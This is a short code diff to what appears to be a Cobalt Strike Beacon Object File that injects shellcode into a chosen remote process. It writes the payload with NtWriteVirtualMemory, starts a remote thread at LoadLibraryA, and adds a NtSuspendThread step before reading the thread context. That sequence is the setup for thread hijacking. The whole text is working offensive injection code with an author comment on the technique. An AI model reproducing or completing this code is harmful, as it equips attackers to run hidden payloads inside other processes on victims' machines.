@@ -19,6 +19,7 @@ void go(char * argc, int len)
 	CLIENT_ID id = {0};
 	OBJECT_ATTRIBUTES oa = {sizeof(oa)};
 	PVOID Alloc = NULL;
+	CONTEXT ctx;
 
 	BeaconDataParse(&parser, argc, len);
 	DWORD pid = BeaconDataInt(&parser);
@@ -35,7 +36,10 @@ void go(char * argc, int len)
 	void *_loadLibrary = KERNEL32$GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
 	NtWriteVirtualMemory(Process_Handle, Alloc, shellcode, shell_len, NULL);
 	NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, Process_Handle, _loadLibrary, NULL, FALSE, 0, 0, 0, NULL);
-	CONTEXT ctx;
+	// Suspend the thread
+	// You can create a thread started in a suspended state with virtualallocex
+	// but I don't know how to do it with NTCreateThreadEx
+	NtSuspendThread(threadHandle, NULL);
 
 	ctx.ContextFlags = CONTEXT_CONTROL;
 	NtGetContextThread(threadHandle, &ctx);
